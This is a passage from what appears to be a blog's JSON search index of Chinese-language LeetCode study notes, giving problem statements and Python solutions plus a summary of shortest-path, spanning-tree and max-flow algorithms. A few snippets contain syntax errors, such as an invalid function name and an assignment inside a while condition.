c or a \u003c c if b - a == d - c.\nExample 1:\nInput: nums = [[4,10,15,24,26],[0,9,12,20],[5,18,22,30]]Output: [20,24]Explanation: List 1: [4, 10, 15, 24,26], 24 is in range [20,24].List 2: [0, 9, 12, 20], 20 is in range [20,24].List 3: [5, 18, 22, 30], 22 is in range [20,24].Example 2:\nInput: nums = [[1,2,3],[1,2,3],[1,2,3]]Output: [1,1]Example 3:\nInput: nums = [[10,10],[11,11]]Output: [10,11]Example 4:\nInput: nums = [[10],[11]]Output: [10,11]Example 5:\nInput: nums = [[1],[2],[3],[4],[5],[6],[7]]Output: [1,7] Constraints:\nnums.length == k1 \u003c= k \u003c= 35001 \u003c= nums[i].length \u003c= 50-105 \u003c= nums[i][j] \u003c= 105nums[i] is sorted in non-decreasing order. Sol class Solution: def smallestRange(self, nums: List[List[int]]) -\u0026gt; List[int]: hq, big = [], float(\u0026#39;-inf\u0026#39;) def add(l,i): nonlocal big heappush(hq,(l[0],i)) big = max(big,l[0]) nums = [deque(l) for l in nums] [add(l,i) for (i,l) in enumerate(nums)] ret = [hq[0][0],big] while len(hq) == len(nums): _, i = heappop(hq) nums[i].popleft() #[print(l) for l in nums] #print(\u0026#34;=====\u0026#34;) if nums[i]: add(nums[i],i) ret = min([ret,[hq[0][0],big]], key=lambda x: x[1]-x[0]) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-632-smallest-range-covering-elements-from-k-lists/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就heap\u003c/p\u003e","title":"leetcode-632 - Smallest Range Covering Elements from K Lists"},{"content":"動機 Hard題都是來看創意的\n用pair讓兩個dfs整合在一起 把prefix與suffix encode成一個字串 Problem Design a special dictionary with some words that searchs the words in it by a prefix and a suffix.\nImplement the WordFilter class:\nWordFilter(string[] words) Initializes the object with the words in the dictionary.f(string prefix, string suffix) Returns the index of the word in the dictionary, which has the prefix prefix and the suffix suffix. If there is more than one valid index, return the largest of them. If there is no such word in the dictionary, return -1. Example 1:\nInput[WordFilter, f][[[apple]], [a, e]]Output[null, 0]ExplanationWordFilter wordFilter = new WordFilter([apple]);wordFilter.f(a, e); // return 0, because the word at index 0 has prefix = a and suffix = 'e. Constraints:\n1 \u003c= words.length \u003c= 150001 \u003c= words[i].length \u003c= 101 \u003c= prefix.length, suffix.length \u003c= 10words[i], prefix and suffix consist of lower-case English letters only.At most 15000 calls will be made to the function f. Sol 兩個Trie配set intersection會超時?\n那就上cache\nclass Trie: def __init__(self): self.next = defaultdict(Trie) self.idxs = set() def add(self,s,i): now = self while s: now = now.next[s[0]] s = s[1:] now.idxs.add(i) @cache def dfs(self,s): if s: if s[0] in self.next: return self.next[s[0]].dfs(s[1:]) else: return set() elif not self.next: return self.idxs else: return self.idxs.union(*[self.next[c].dfs(\u0026#34;\u0026#34;) for c in self.next]) class WordFilter: def __init__(self, words: List[str]): self.forward = Trie() self.backward = Trie() for (i,s) in enumerate(words): self.forward.add(s,i) self.backward.add(s[::-1],i) @cache def f(self, prefix: str, suffix: str) -\u0026gt; int: #print(self.forward.dfs(prefix) , self.backward.dfs(suffix)) return max(list(self.forward.dfs(prefix) \u0026amp; self.backward.dfs(suffix[::-1])),default=-1) 或是，把單字與reverse的單字合成pair，就可以同時看了\nTrie = lambda: collections.defaultdict(Trie) WEIGHT = False class WordFilter(object): def __init__(self, words): self.trie = Trie() for weight, word in enumerate(words): cur = self.trie cur[WEIGHT] = weight for i, x in enumerate(word): #Put all prefixes and suffixes tmp = cur for letter in word[i:]: tmp = tmp[letter, None] tmp[WEIGHT] = weight tmp = cur for letter in word[:-i or None][::-1]: tmp = tmp[None, letter] tmp[WEIGHT] = weight #Advance letters cur = cur[x, word[~i]] cur[WEIGHT] = weight def search(self, prefix, suffix): cur = self.trie for a, b in map(None, prefix, suffix[::-1]): if (a, b) not in cur: return -1 cur = cur[a, b] return cur[WEIGHT] 或是，把suffix放前面再把單字放後面，像\n#apple，e#apple，el#apple，ple#apple，pple#apple，apple#apple\nTrie = lambda: collections.defaultdict(Trie) WEIGHT = False class WordFilter(object): def __init__(self, words): self.trie = Trie() for weight, word in enumerate(words): word += \u0026#39;#\u0026#39; for i in xrange(len(word)): cur = self.trie cur[WEIGHT] = weight for j in xrange(i, 2 * len(word) - 1): cur = cur[word[j % len(word)]] cur[WEIGHT] = weight def f(self, prefix, suffix): cur = self.trie for letter in suffix + \u0026#39;#\u0026#39; + prefix: if letter not in cur: return -1 cur = cur[letter] return cur[WEIGHT] ","permalink":"https://littlebees.github.io/2021/08/leetcode-745-prefix-and-suffix-search/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eHard題都是來看創意的\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cem\u003e用pair讓兩個dfs整合在一起\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e把prefix與suffix encode成一個字串\u003c/em\u003e\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-745 - Prefix and Suffix Search"},{"content":"動機 Hard題都是來看創意的\n把 group encode成起點與終點\n同時這題也是遇過最複雜的一題\nProblem There are n items each belonging to zero or one of m groups where group[i] is the group that the i-th item belongs to and it's equal to -1 if the i-th item belongs to no group. The items and the groups are zero indexed. A group can have no item belonging to it.\nReturn a sorted list of the items such that:\nThe items that belong to the same group are next to each other in the sorted list.There are some relations between these items where beforeItems[i] is a list containing all the items that should come before the i-th item in the sorted array (to the left of the i-th item).Return any solution if there is more than one solution and return an empty list if there is no solution.\nExample 1:\nInput: n = 8, m = 2, group = [-1,-1,1,0,0,1,0,-1], beforeItems = [[],[6],[5],[6],[3,6],[],[],[]]Output: [6,3,4,1,5,2,0,7]Example 2:\nInput: n = 8, m = 2, group = [-1,-1,1,0,0,1,0,-1], beforeItems = [[],[6],[5],[6],[3],[],[4],[]]Output: []Explanation: This is the same as example 1 except that 4 needs to be before 6 in the sorted list. Constraints:\n1 \u003c= m \u003c= n \u003c= 3 * 104group.length == beforeItems.length == n-1 \u003c= group[i] \u003c= m - 10 \u003c= beforeItems[i].length \u003c= n - 10 \u003c= beforeItems[i][j] \u003c= n - 1i != beforeItems[i][j]beforeItems[i] does not contain duplicates elements. Sol n+ group_idx是group的起點 n++m group_idx是group的終點\n接著從終點開始走回去(因為是dfs)，所以從數字大的(group的終點)走回去\nclass Solution: def sortItems(self, n: int, m: int, group: List[int], beforeItems: List[List[int]]) -\u0026gt; List[int]: prog = defaultdict(int) # 1 process, 2 done gh = defaultdict(set) not_used = set(range(n)) # add group for (i,g) in enumerate(group): if g != -1: gh[n+g].add(i) # entry of group gh[i].add(n+m+g) # exit of group # add before relation for (i,bs) in enumerate(beforeItems): for b in bs: if group[i] == group[b] and group[i] != -1: gh[b].add(i) else: i_entry = n+group[i] if group[i] != -1 else i b_exit = n+m+group[b] if group[b] != -1 else b gh[b_exit].add(i_entry) def topo(i,ret): if prog[i] == 1: raise \u0026#39;loop\u0026#39; elif prog[i] == 2: return [] else: prog[i] = 1 [topo(x,ret) for x in gh[i]] if i\u0026lt;n: not_used.remove(i) ret.append(i) prog[i] = 2 return ret try: order = sorted(gh.keys())[::-1] dep = [] [topo(i,dep) for i in order] return dep[::-1]+list(not_used) except: return [] ","permalink":"https://littlebees.github.io/2021/08/leetcode-1203-sort-items-by-groups-respecting-dependencies/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eHard題都是來看創意的\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e把 group encode成起點與終點\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e同時這題也是遇過最複雜的一題\u003c/p\u003e","title":"leetcode-1203 - Sort Items by Groups Respecting Dependencies"},{"content":"動機 Hard題都是來看創意的\n中間是回文，前半是後面的reverse\nProblem Given a list of unique words, return all the pairs of the distinct indices (i, j) in the given list, so that the concatenation of the two words words[i] + words[j] is a palindrome.\nExample 1:\nInput: words = [abcd,dcba,lls,s,sssll]Output: [[0,1],[1,0],[3,2],[2,4]]Explanation: The palindromes are [dcbaabcd,abcddcba,slls,llssssll]Example 2:\nInput: words = [bat,tab,cat]Output: [[0,1],[1,0]]Explanation: The palindromes are [battab,tabbat]Example 3:\nInput: words = [a,]Output: [[0,1],[1,0]] Constraints:\n1 \u003c= words.length \u003c= 50000 \u003c= words[i].length \u003c= 300words[i] consists of lower-case English letters. Sol 回文\n前半是後面的reverse (反之亦然) 中間是回文，前半是後面的reverse (反之亦然) 這樣就不用一個一個去對了，可以善用dict\nclass Solution: def palindromePairs(self, words: List[str]) -\u0026gt; List[List[int]]: def palind(s): return s == s[::-1] ws = {w[::-1]: i for (i,w) in enumerate(words) if w} ret = [] for (i,w1) in enumerate(words): if not w1: #empty ret += sum([[[i,j],[j,i]] for (j,w2) in enumerate(words) if i!=j and palind(w2)],[]) else: # total word if w1 in ws and ws[w1] != i: ret.append([i,ws[w1]]) for x in range(1,len(w1)): l,r = w1[:x],w1[x:] # left is center if palind(l) and r in ws: ret.append([ws[r],i]) # right is center if palind(r) and l in ws: ret.append([i,ws[l]]) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-336-palindrome-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eHard題都是來看創意的\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e中間是回文，前半是後面的reverse\u003c/em\u003e\u003c/p\u003e","title":"leetcode-336 - Palindrome Pairs"},{"content":"動機 題目明明已經把same length上粗體了，還看不到\u0026hellip;\nProblem You are given a string s and an array of strings words of the same length. Return all starting indices of substring(s) in s that is a concatenation of each word in words exactly once, in any order, and without any intervening characters.\nYou can return the answer in any order.\nExample 1:\nInput: s = barfoothefoobarman, words = [foo,bar]Output: [0,9]Explanation: Substrings starting at index 0 and 9 are barfoo and foobar respectively.The output order does not matter, returning [9,0] is fine too.Example 2:\nInput: s = wordgoodgoodgoodbestword, words = [word,good,best,word]Output: []Example 3:\nInput: s = barfoofoobarthefoobarman, words = [bar,foo,the]Output: [6,9,12] Constraints:\n1 \u003c= s.length \u003c= 104s consists of lower-case English letters.1 \u003c= words.length \u003c= 50001 \u003c= words[i].length \u003c= 30words[i] consists of lower-case English letters. Sol 如果長度一樣就很簡單\nclass Solution: def findSubstring(self, s: str, words: List[str]) -\u0026gt; List[int]: wLen = len(words[0]) def good(s,ws): while ws: if s[:wLen] in ws: if ws[s[:wLen]] == 1: del ws[s[:wLen]] else: ws[s[:wLen]] -= 1 s = s[wLen:] else: return False return True return [i for i in range(len(s)) if len(s)-i\u0026gt;= wLen*len(words) and good(s[i:],Counter(words))] ","permalink":"https://littlebees.github.io/2021/08/leetcode-30-substring-with-concatenation-of-all-words/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e題目明明已經把same length上粗體了，還看不到\u0026hellip;\u003c/p\u003e","title":"leetcode-30 - Substring with Concatenation of All Words"},{"content":"動機 看解答時是跪著的，能理解為什麼有人看到解答就想打錢過去了\nProblem Let's define a function countUniqueChars(s) that returns the number of unique characters on s.\nFor example if s = LEETCODE then L, T, C, O, D are the unique characters since they appear only once in s, therefore countUniqueChars(s) = 5.Given a string s, return the sum of countUniqueChars(t) where t is a substring of s.\nNotice that some substrings can be repeated so in this case you have to count the repeated ones too.\nExample 1:\nInput: s = ABCOutput: 10Explanation: All possible substrings are: A,B,C,AB,BC and ABC.Evey substring is composed with only unique letters.Sum of lengths of all substring is 1 + 1 + 1 + 2 + 2 + 3 = 10Example 2:\nInput: s = ABAOutput: 8Explanation: The same as example 1, except countUniqueChars(ABA) = 1.Example 3:\nInput: s = LEETCODEOutput: 92 Constraints:\n1 \u003c= s.length \u003c= 105s consists of uppercase English letters only. Sol AXXXAXXA =\u0026gt; 左邊的A到中間的A有4個洞，另一邊有3的洞，所以可以生12個只包含A的string\n超神奇，在大家想著怎麼處理重複的substring時，lee215直接把組合算出來，直接加，dp什麼的不用不用\nclass Solution: def uniqueLetterString(self, s: str) -\u0026gt; int: tbl = defaultdict(lambda : [-1,-1]) ret = 0 for (j,c) in enumerate(s): i,k = tbl[c] ret += (k-i)*(j-k) tbl[c] = [k,j] for (i,k) in tbl.values(): ret += (len(s)-k)*(k-i) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-828-count-unique-characters-of-all-substrings-of-a-given-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看解答時是跪著的，能理解為什麼有人看到解答就想打錢過去了\u003c/p\u003e","title":"leetcode-828 - Count Unique Characters of All Substrings of a Given String"},{"content":"動機 對的資料結構帶你上天堂\nProblem The median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle values.\nFor examples, if arr = [2,3,4], the median is 3.For examples, if arr = [1,2,3,4], the median is (2 + 3) / 2 = 2.5.You are given an integer array nums and an integer k. There is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the k numbers in the window. Each time the sliding window moves right by one position.\nReturn the median array for each window in the original array. Answers within 10-5 of the actual value will be accepted.\nExample 1:\nInput: nums = [1,3,-1,-3,5,3,6,7], k = 3Output: [1.00000,-1.00000,-1.00000,3.00000,5.00000,6.00000]Explanation: Window position Median--------------- -----[1 3 -1] -3 5 3 6 7 1 1 [3 -1 -3] 5 3 6 7 -1 1 3 [-1 -3 5] 3 6 7 -1 1 3 -1 [-3 5 3] 6 7 3 1 3 -1 -3 [5 3 6] 7 5 1 3 -1 -3 5 [3 6 7] 6Example 2:\nInput: nums = [1,2,3,4,2,3,1,4,2], k = 3Output: [2.00000,3.00000,3.00000,3.00000,2.00000,3.00000,2.00000] Constraints:\n1 \u003c= k \u003c= nums.length \u003c= 105231 \u003c= nums[i] \u003c= 231 - 1 Sol from sortedcontainers import SortedList class Solution: def medianSlidingWindow(self, nums: List[int], k: int) -\u0026gt; List[float]: hq = SortedList(nums[:k-1]) ret = [] a = 0 for i in range(k-1,len(nums)): hq.add(nums[i]) ret.append(hq[(k-1)//2]*1.0 if k% 2 == 1 else (hq[k//2]+hq[k//2-1])/2) hq.remove(nums[a]) a += 1 return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-480-sliding-window-median/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e對的資料結構帶你上天堂\u003c/p\u003e","title":"leetcode-480 - Sliding Window Median"},{"content":"動機 下次處理flip就要這樣處理\nProblem You are given a binary array nums and an integer k.\nA k-bit flip is choosing a subarray of length k from nums and simultaneously changing every 0 in the subarray to 1, and every 1 in the subarray to 0.\nReturn the minimum number of k-bit flips required so that there is no 0 in the array. If it is not possible, return -1.\nA subarray is a contiguous part of an array.\nExample 1:\nInput: nums = [0,1,0], k = 1Output: 2Explanation: Flip nums[0], then flip nums[2].Example 2:\nInput: nums = [1,1,0], k = 2Output: -1Explanation: No matter how we flip subarrays of size 2, we cannot make the array become [1,1,1].Example 3:\nInput: nums = [0,0,0,1,0,1,1,0], k = 3Output: 3Explanation: Flip nums[0],nums[1],nums[2]: nums becomes [1,1,1,1,0,1,1,0]Flip nums[4],nums[5],nums[6]: nums becomes [1,1,1,1,1,0,0,0]Flip nums[5],nums[6],nums[7]: nums becomes [1,1,1,1,1,1,1,1] Constraints:\n1 \u003c= nums.length \u003c= 3 * 1041 \u003c= k \u003c= nums.length Sol 不難看出要用greedy，把不用改的去掉，把需要flip的flip\n但是反覆的flip很花時間，所以要想辦法處理這段\n這裡用queue的長度代表被flip的次數，這樣只要放開始flip的index就可以找出什麼時候結束\nclass Solution: def minKBitFlips(self, nums: List[int], k: int) -\u0026gt; int: q = deque() ret = 0 for (i,n) in enumerate(nums): if q and i \u0026gt;= q[0]+k: q.popleft() if n == (len(q) % 2): if i+k \u0026lt;= len(nums): q.append(i) else: return -1 ret += 1 return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-995-minimum-number-of-k-consecutive-bit-flips/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e下次處理flip就要這樣處理\u003c/p\u003e","title":"leetcode-995 - Minimum Number of K Consecutive Bit Flips"},{"content":"動機 寫給自己的leetcode筆記\n搜尋與走訪 一個是找有沒有，一個是記下所有符合條件的東西\n但本質都一樣，都要讓狀態變化，去看對不對，而走訪就是把資料拆分成一定單位\n怎麼拆分就是依據需要的狀態(題目需求)與本身是什麼資料結構(List, Tree, Graph)\n搜尋範圍 讓搜尋範圍合理的改變(把不需要的劃掉，或是保留可能性)\n太小變大 太大變小 用完後變小 並保持住需要的屬性(order, 大小, 回文, 題目定的規則) 拆分的方式 List traversal 頭到尾 (可以看成時間，見188) greedy (看class schedule 3) 選大 (結果最大) 選小 (保留可能性) 找出限制，以此sort，而這個限制就是構成搜尋範圍的要素 從中點走(一半) binary search divide and conquer 從中點往外擴 兩邊左右走 two pointer sublist \u0026amp; range sliding window prefix sum 有序 sort heap 多list合一 trie merge pointer as each list mutual recursion 把DP想成一個list(或是說做完動作後的狀態)，之後開始merge 188. Best Time to Buy and Sell Stock IV tree 根與子樹 DFS 前中後序 (greedy) threading DP \u0026amp; 記憶法 DP想成stream Binary search tree 大小 數字範圍 BFS level by level BFS DFS with other pointer 左到右、右到左 DFS Line sweeping graph 起點終點 DFS BFS 外到內，內到外 BFS math \u0026amp; bit operation xor even \u0026amp; odd random 平均的出現 bit 與 bit之間是獨立的，如果不是當成list用就是一起用bit operation 為了保持條件操作，進而平攤操作 1172. Dinner Plate Stacks 綜合技 用別的資料結構描述其他變數 class schedule 3 把資料encode在同一個資料結構上以合併走訪 Sort Items by Groups Respecting Dependencies Prefix and Suffix Search ","permalink":"https://littlebees.github.io/2021/08/combinatorial-objects/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫給自己的leetcode筆記\u003c/p\u003e","title":"combinatorial-objects"},{"content":"動機 就簡單地(口頭)描述演算法的重點在哪 話說這讓我想起許多做過的leetcode\n手法 greedy 選大(結果變大) 去掉小(可能性變大) 沒辦法就當前資訊知道結果 BFS 走的node數最少 列舉就是往組成的東西下手 距離就會是 中點、起點 shortest-path BFS 類別: BFS(走的node數最少)\n從起點往外擴散，直到起點\n每個點之間的距離都是一樣的，所以決定到終點之間距離多遠，是中間有多少點\ndef bfs(graph, start, end): vis = set() q = deque([(start,0)]) while q: node, dis = q.popleft() if node is end: return dis else: vis.add(node) q.extend([(x, dis+1) for x in graph[node] if x not in vis]) return -1 # cycle exists Dijkstra 類別: BFS+greedy(能走過去的邊)\n現在點之間的距離會變，所以需要一個表紀錄從起點到這個點的最短距離\n會需要挑最短的下一個點，所以還要Heap去sort下一個最短的點\ndef dijkstra(graph, start, end): hq = [(0,start)] # heapq dists = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) # node -\u0026gt; distance dists[start] = 0 while hq: dis, node = heappop(hq) for x,w in graph[node]: if dists[node]+w \u0026lt; dists[x]: dists[x] = dists[node]+w heappush(hq, (dists[x], x)) return dists[end] Floyd-Warshall 類別: 列舉(中間點)\n試過每個中間點，在比原本距離小時更新，同時這可以知道所有點到另一個點的最短距離\ndef floyd-warshall(graph, start, end): dists = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) # node -\u0026gt; distance dists[(start,start)] = 0 for mid in graph.keys(): for a in graph.keys(): for b in graph.keys(): if dists[(a,b)] \u0026gt; dists[(a,mid)]+graph[mid][b]: dists[(a,b)] = dists[(a,mid)]+graph[mid][b] return dists[(start,end)] Bellman–Ford 類別: 列舉(起點)\n最長的長度就是所以點都走過一次(所以可以避免負環一直走的問題) 一直延長每個點的長度，最後就是最短路徑\ndef bellman–ford(graph, start, end): dists = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) # node -\u0026gt; distance dists[(start,start)] = 0 for _ in len(graph.keys()): for a in graph.keys(): for b,w in graph[a]: if dists[b] \u0026gt; dists[a]+w: dists[b] = dists[a]+w if any(dists[b] \u0026gt; dists[a]+w for a in graph.keys() for b,w in graph[a]): # negtive cycle return None else: return dists[end] Minimum Spanning Tree Prim 類別: BFS+greedy(能走過去的邊)\nDijkstra是距離，dist[a]+graph[a][b] Prim，一樣是求最小，一樣點之間的距離會變，但SMT只要edge最小就好，所以用heap每次挑最小的edge\ndef prim(graph): start = next(graph.keys()) hq = [(0,start)] # heapq dists = defaultdict(lambda : float(\u0026#39;inf\u0026#39;)) # node -\u0026gt; distance parent = {} dists[start] = 0 parent[start] = None while hq: dis, node = heappop(hq) for x,w in graph[node]: if w \u0026lt; dists[x]: # HERE!! parent[x] = node dists[x] = w heappush(hq, (dists[x], x)) return parent Kruskal 類別: greedy(邊) 每次挑最小的edge去湊，直到變成一棵樹\ndef kruskal(graph): hq = [] for a in graph.keys(): for b,w in graph[a]: heappush(hq, (w, (a,b))) uf = {k:k for k in graph.keys()} ranks = {k:1 for k in graph.keys()} def find(a): while a != uf[a]: a = uf[a] return a def union(a,b): if find(a) != find(b): if ranks[a] \u0026gt;= ranks[b]: uf[b] = a rank[a] += rank[b] else: uf[a] = uf[b] rank[b] += rank[a] vis = set() while len(vis) \u0026lt; len(graph.keys()): _, (a,b) = heappop(hq) if a in vis and b in vis: continue else: [vis.add(x) for x in (a,b)] union(a,b) return uf Flow Networks 這裡要求的是讓流過的水量最大\n這個不像距離，每走一步就知道當前距離多少。 這要走到最後才會知道bottleneck在哪。\nFord-Fulkerson 類別: greedy(用到的edge最少, 所以算是BFS)\n我們沒辦法就當前資訊知道結果如何，但可以在每次選擇中保留可能性\n讓path用到的edge越少越好 (讓總edge的quota剩的多) 並且每次只丟掉最小的edge!!\n所以用BFS讓走的node數最少，這樣就ok了\ndef BFS(graph, s, t): queue = deque() parent = {} queue.append(s) parent[s] = None while queue: a = queue.popleft() for b, val in enumerate(graph[a]): if b not in parent and val \u0026gt; 0: # 不走0，每次只丟掉最小的edge queue.append(b) parent[b] = a if b == t: return parent return False def FordFulkerson(source, sink): max_flow = 0 while (parent = BFS(graph, source, sink)) : path_flow = float(\u0026#34;Inf\u0026#34;) s = sink while s != source: path_flow = min(path_flow, graph[parent[s]][s]) s = parent[s] max_flow += path_flow v = sink while(v != source): u = parent[v] graph[u][v] -= path_flow # 不走0，每次只丟掉最小的edge graph[v][u] += path_flow # 反向流 v = parent[v] return max_flow ","permalink":"https://littlebees.github.io/2021/08/%E6%9C%80%E7%9F%AD%E8%B7%9D%E9%9B%A2%E6%BC%94%E7%AE%97%E6%B3%95%E7%B0%A1%E5%96%AE%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就簡單地(口頭)描述演算法的重點在哪\n話說這讓我想起許多做過的leetcode\u003c/p\u003e","title":"最短距離演算法簡單筆記"},{"content":"動機 巧妙地讓heap描述當前總和的組成\nProblem There are n different online courses numbered from 1 to n. You are given an array courses where courses[i] = [durationi, lastDayi] indicate that the ith course should be taken continuously for durationi days and must be finished before or on lastDayi.\nYou will start on the 1st day and you cannot take two or more courses simultaneously.\nReturn the maximum number of courses that you can take.\nExample 1:\nInput: courses = [[100,200],[200,1300],[1000,1250],[2000,3200]]Output: 3Explanation: There are totally 4 courses, but you can take 3 courses at most:First, take the 1st course, it costs 100 days so you will finish it on the 100th day, and ready to take the next course on the 101st day.Second, take the 3rd course, it costs 1000 days so you will finish it on the 1100th day, and ready to take the next course on the 1101st day. Third, take the 2nd course, it costs 200 days so you will finish it on the 1300th day. The 4th course cannot be taken now, since you will finish it on the 3300th day, which exceeds the closed date.Example 2:\nInput: courses = [[1,2]]Output: 1Example 3:\nInput: courses = [[3,2],[4,3]]Output: 0 Constraints:\n1 \u003c= courses.length \u003c= 1041 \u003c= durationi, lastDayi \u003c= 104 Sol heap裡面放所有被選的課\n然後先用課的deadline去排序，可以把時間想成list，這樣選課就變成list的走訪，就算前面的某次課不選，也可以放心地拿掉\nclass Solution: def scheduleCourse(self, cs: List[List[int]]) -\u0026gt; int: cs.sort(key=lambda x: x[1]) hq, cnt = [], 0 for c in cs: cnt += c[0] heappush(hq,-c[0]) if cnt \u0026gt; c[1]: cnt += hq[0] heappop(hq) return len(hq) ","permalink":"https://littlebees.github.io/2021/08/leetcode-630-course-schedule-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e巧妙地讓heap描述當前總和的組成\u003c/p\u003e","title":"leetcode-630 - Course Schedule III"},{"content":"動機 python的主場來啦\nProblem You are given an n x n binary matrix grid. You are allowed to change at most one 0 to be 1.\nReturn the size of the largest island in grid after applying this operation.\nAn island is a 4-directionally connected group of 1s.\nExample 1:\nInput: grid = [[1,0],[0,1]]Output: 3Explanation: Change one 0 to 1 and connect two 1s, then we get an island with area = 3.Example 2:\nInput: grid = [[1,1],[1,0]]Output: 4Explanation: Change the 0 to 1 and make the island bigger, only one island with area = 4.Example 3:\nInput: grid = [[1,1],[1,1]]Output: 4Explanation: Can't change any 0 to 1, only one island with area = 4. Constraints:\nn == grid.lengthn == grid[i].length1 \u003c= n \u003c= 500grid[i][j] is either 0 or 1. Sol 用dfs找面積，之後用dfs設定面積\n在設定面積時會碰到邊界，就可以用list去放現在的面積，但下一個遇到list也可以放\n最後就是數list的總和\nclass Solution: def largestIsland(self, grid: List[List[int]]) -\u0026gt; int: def area(i,j): if 0\u0026lt;= i \u0026lt; len(grid) and 0 \u0026lt;= j \u0026lt; len(grid[i]) and grid[i][j] == 1: grid[i][j] = -1 dirs = [(i+1,j),(i,j+1),(i-1,j),(i,j-1)] return sum([area(x,y) for (x,y) in dirs])+1 else: return 0 def setArea(i,j,n,seen): if 0\u0026lt;= i \u0026lt; len(grid) and 0 \u0026lt;= j \u0026lt; len(grid[i]): if grid[i][j] == -1: grid[i][j] = n dirs = [(i+1,j),(i,j+1),(i-1,j),(i,j-1)] [setArea(x,y,n,seen) for (x,y) in dirs] elif grid[i][j] == 0: grid[i][j] = [n] seen.add((i,j)) elif isinstance(grid[i][j], list) and (i,j) not in seen: seen.add((i,j)) grid[i][j].append(n) for i in range(len(grid)): for j in range(len(grid[i])): if grid[i][j] == 1: setArea(i,j,area(i,j)+1,set()) # to distigish 1 from area 1 ret = 1 for i in range(len(grid)): for j in range(len(grid[i])): if isinstance(grid[i][j], list): ret = max(ret, 1+sum(grid[i][j])-len(grid[i][j])) else: ret = max(ret, grid[i][j]-1) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-827-making-a-large-island/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epython的主場來啦\u003c/p\u003e","title":"leetcode-827 - Making A Large Island"},{"content":"動機 我覺得我自己寫的很難懂，所以來看別人的\nProblem Given an array nums with n integers, your task is to check if it could become non-decreasing by modifying at most one element.\nWe define an array is non-decreasing if nums[i] \u003c= nums[i + 1] holds for every i (0-based) such that (0 \u003c= i \u003c= n - 2).\nExample 1:\nInput: nums = [4,2,3]Output: trueExplanation: You could modify the first 4 to 1 to get a non-decreasing array.Example 2:\nInput: nums = [4,2,1]Output: falseExplanation: You can't get a non-decreasing array by modify at most one element. Constraints:\nn == nums.length1 \u003c= n \u003c= 104-105 \u003c= nums[i] \u003c= 105 Sol 中間的必須在中間，所以有兩個case，太大或太小 最前面大於最後面\n對應的改法是 最前面大於最後面 =\u0026gt; 最前面改小 中間太大 =\u0026gt; 改與前面一樣 中間太大 =\u0026gt; 改與前面一樣\n1,2,3 1,4,3 4,2,3 2,1,3 class Solution: def checkPossibility(self, nums: List[int]) -\u0026gt; bool: if len(nums) == 1: return True else: chance = 1 if nums[0] \u0026lt; nums[1]: chance = 1 else: nums[0] = nums[1]-1 chance = 0 for i in range(1,len(nums)-1): if not (nums[i-1] \u0026lt;= nums[i] \u0026lt;= nums[i+1]): if chance == 0: return False if chance != 0: chance -= 1 if nums[i-1] \u0026gt; nums[i+1]: if nums[i] \u0026gt;= nums[i-1]: nums[i+1] = nums[i] else: return False else: nums[i] = (nums[i-1]+nums[i+1])//2 return True 但我覺得我自己寫的很難懂，所以來看別人的 如果出事的話，兩個case\n前面太大，像1,4,3，所以要看arr[i-2]與arr[i]的大小 現在太小，不是前面太大就是現在太小 public boolean checkPossibility(int[] nums) { int cnt = 0; //the number of changes for(int i = 1; i \u0026lt; nums.length \u0026amp;\u0026amp; cnt\u0026lt;=1 ; i++){ if(nums[i-1] \u0026gt; nums[i]){ cnt++; if(i-2\u0026lt;0 || nums[i-2] \u0026lt;= nums[i])nums[i-1] = nums[i]; //modify nums[i-1] of a priority else nums[i] = nums[i-1]; //have to modify nums[i] } } return cnt\u0026lt;=1; } ","permalink":"https://littlebees.github.io/2021/08/leetcode-665-non-decreasing-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我覺得我自己寫的很難懂，所以來看別人的\u003c/p\u003e","title":"leetcode-665 - Non-decreasing Array"},{"content":"動機 第一次看到bfs這麼用 這樣叫topo sort嗎? 很漂亮的算法，真的很漂亮 Problem A tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.\nGiven a tree of n nodes labelled from 0 to n - 1, and an array of n - 1 edges where edges[i] = [ai, bi] indicates that there is an undirected edge between the two nodes ai and bi in the tree, you can choose any node of the tree as the root. When you select a node x as the root, the result tree has height h. Among all possible rooted trees, those with minimum height (i.e. min(h)) are called minimum height trees (MHTs).\nReturn a list of all MHTs' root labels. You can return the answer in any order.\nThe height of a rooted tree is the number of edges on the longest downward path between the root and a leaf.\nExample 1:\nInput: n = 4, edges = [[1,0],[1,2],[1,3]]Output: [1]Explanation: As shown, the height of the tree is 1 when the root is the 